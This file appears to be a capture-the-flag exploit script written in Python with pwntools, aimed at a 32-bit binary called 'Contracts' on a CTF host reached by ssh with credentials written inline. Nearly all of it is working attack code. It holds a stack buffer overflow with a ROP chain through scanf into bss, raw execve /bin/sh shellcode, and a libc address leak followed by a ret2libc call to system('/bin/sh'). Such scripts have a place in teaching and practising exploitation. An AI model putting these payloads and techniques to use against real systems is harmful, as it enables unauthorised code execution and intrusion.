from pwn import *
context.log_level = 'debug'

TARGET = './Contracts'
HOST = ''
PORT = 0 

elf = ELF(TARGET)
def start():
    if not args.R:
        print "local"
        # return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        return process(TARGET, stdout=process.PTY, stdin=process.PTY)

    else:
        print "remote" 
        # return remote(HOST, PORT)
        return process('sh', stdout=process.PTY, stdin=process.PTY)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

r = start()
if args.D:
    debug(r, [0x692]) 

if args.R:
    r.sendline('ssh yeet@ctf2.kaf.sh -p 7010')
    r.sendlineafter('password:', '12345678')

bss = 0x0804a000 + 0x808
format = 0x80487ef


payload = ''
payload += 'A'*264
payload += p32(elf.plt['__isoc99_scanf'])
payload += p32(elf.plt['__isoc99_scanf'])
payload += p32(bss)
payload += p32(format)
payload += p32(bss) 
payload += p32(format)
payload += p32(bss+20)

r.sendlineafter('3-Exit\n', '2') 
r.sendlineafter(':', payload) 
r.sendlineafter('3-Exit\n', '3') 

_32_SHELLCODE = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\xf4\xf6\xd0\xcd\x80"
r.sendline(_32_SHELLCODE)

r.interactive()






payload = ''
payload += 'A'*264
# payload += p32(bss)
payload += p32(elf.plt['puts'])
payload += p32(elf.sym['main'])
payload += p32(elf.got['__libc_start_main'])

r.sendlineafter('3-Exit\n', '2') 
r.sendlineafter(':', payload) 
# r.sendlineafter(': ', "B" * 0x32+'\x01'+"C" * 0xd2) 
r.sendlineafter('3-Exit\n', '3') 
leak = u32(r.recv(4))
dbg("leak")

base = leak - 0x18d90
system = base + 0x3d201
binsh = base + 0x17e0cf
gets = base + 0x672b0

'''
if args.D: 
    base = leak - 0x1e660
    system = base + 0x42c00
    binsh = base + 0x184b35
    gets = base + 0x6c8d0
'''

dbg("base")
dbg("binsh")
dbg("gets")

payload = ''
payload += 'A'*264
# payload += p32(bss)
payload += p32(system)
payload += p32(elf.sym['main'])
payload += p32(binsh)

r.sendlineafter('3-Exit\n', '2') 
# r.sendlineafter(':', payload) 
r.sendlineafter(':', payload) 
r.sendlineafter('3-Exit\n', '3') 
r.interactive()

_32_SHELLCODE = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\xf4\xf6\xd0\xcd\x80"
r.sendline(_32_SHELLCODE)

r.interactive()
r.close()
